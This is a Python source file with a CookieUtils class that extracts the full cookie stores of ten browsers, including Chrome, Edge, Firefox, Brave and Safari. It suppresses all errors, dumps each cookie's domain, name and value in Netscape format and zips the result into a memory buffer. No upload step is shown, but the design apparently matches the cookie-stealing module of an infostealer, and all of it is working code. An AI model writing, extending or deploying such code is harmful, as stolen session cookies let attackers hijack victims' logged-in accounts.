import browser_cookie3 as cookie3
import http.cookiejar as cookielib
import io
import zipfile
from utils import BrowserUtils

class CookieUtils:
    class CookieObject:
        def __init__(self, cookie_jar: cookielib.CookieJar, browser_id: int) -> None:
            self.cookie_jar = cookie_jar
            self.browser_id = browser_id

    def __init__(self) -> None:
        pass
    
    def get_cookies(self) -> list[CookieObject]:
        result = []

        for i in range(0, 10):
            try:
                result.append(self.__get_cookie(index=i))
            except:
                pass

        return result
    
    def zip_cookie_dict(self, cookie_dict: dict) -> io.BytesIO:
        zip_file_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_file_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            for key, value in cookie_dict.items():
                zip_file.writestr(key, value)
        zip_file_buffer.seek(0)

        return zip_file_buffer
    
    def cookiejar_to_str(self, cookiejar: cookielib.CookieJar) -> str:
        result_list = []
        for cookie in cookiejar:
            result_list.append(self.__pretty_cookie(cookie=cookie))

        return '\n'.join(result_list)
    
    def __get_cookie(self, index: int) -> CookieObject:
        match index:
            case BrowserUtils.CHROME:
                return self.CookieObject(cookie3.chrome(), BrowserUtils.CHROME)
            case BrowserUtils.CHROMIUM:
                return self.CookieObject(cookie3.chromium(), BrowserUtils.CHROMIUM)
            case BrowserUtils.EDGE:
                return self.CookieObject(cookie3.edge(), BrowserUtils.EDGE)
            case BrowserUtils.BRAVE:
                return self.CookieObject(cookie3.brave(), BrowserUtils.BRAVE)
            case BrowserUtils.VIVALDI:
                return self.CookieObject(cookie3.vivaldi(), BrowserUtils.VIVALDI)
            case BrowserUtils.FIREFOX:
                return self.CookieObject(cookie3.firefox(), BrowserUtils.FIREFOX)
            case BrowserUtils.OPERA:
                return self.CookieObject(cookie3.opera(), BrowserUtils.OPERA)
            case BrowserUtils.OPERA_GX:
                return self.CookieObject(cookie3.opera_gx(), BrowserUtils.OPERA_GX)
            case BrowserUtils.SAFARI:
                return self.CookieObject(cookie3.safari(), BrowserUtils.SAFARI)
            case BrowserUtils.LIBREWOLF:
                return self.CookieObject(cookie3.librewolf(), BrowserUtils.LIBREWOLF)
    
    def __pretty_cookie(self, cookie: cookielib.Cookie) -> str:
        int_to_bool = lambda input: input == 1
        return f"{cookie.domain}\t{str(cookie.domain_initial_dot).upper()}\t{cookie.path}\t{str(int_to_bool(cookie.secure)).upper()}\t{cookie.expires}\t{cookie.name}\t{cookie.value}"